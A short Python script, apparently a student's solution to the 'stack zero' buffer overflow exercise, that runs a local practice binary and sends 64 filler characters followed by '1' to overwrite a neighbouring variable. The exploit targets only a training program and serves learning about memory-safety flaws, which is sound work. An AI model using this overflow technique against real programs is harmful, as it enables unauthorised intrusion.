# Troy Crawford
# 8/11/2021
# Stackzero - Exploit Excerices
 
from subprocess import Popen, PIPE
 
# Popen opens up executable, universal_newlines=True allows for input to be treated like a string.
p = Popen("/home/troy/Documents/probsets/stackzero.c.o", stdin=PIPE, stdout=PIPE, stderr=PIPE, universal_newlines=True)

buffer_len = 64

# Fill the buffer's length with garbage. Afterwards, put any non-zero value into the input.
output = p.communicate(input=('x'*buffer_len + '1'))
print(output)